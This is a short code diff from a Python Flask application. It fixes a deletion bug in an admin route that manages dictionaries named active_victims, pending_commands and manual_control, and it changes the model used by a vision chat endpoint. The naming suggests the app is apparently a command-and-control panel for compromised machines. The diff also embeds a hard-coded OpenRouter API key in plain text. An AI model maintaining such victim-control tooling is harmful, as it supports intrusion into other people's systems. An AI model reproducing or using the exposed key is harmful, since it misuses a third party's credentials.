@@ -926,7 +926,7 @@ def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
-    if target_ip in pending_commands: del active_victims[target_ip]
+    if target_ip in pending_commands: del pending_commands[target_ip]
     if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
@@ -1005,9 +1005,9 @@ def chat_api():
             try:
                 openrouter_key = "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"
                 
-                # Жёстко зафиксированная стабильная модель Llama Vision для надежного анализа картинок
+                # Возвращаем динамический роутер openrouter/free для анализа картинок
                 vision_payload = {
-                    "model": "meta-llama/llama-3.2-11b-vision-instruct:free",
+                    "model": "openrouter/free",
                     "messages": [
                         {
                             "role": "user",
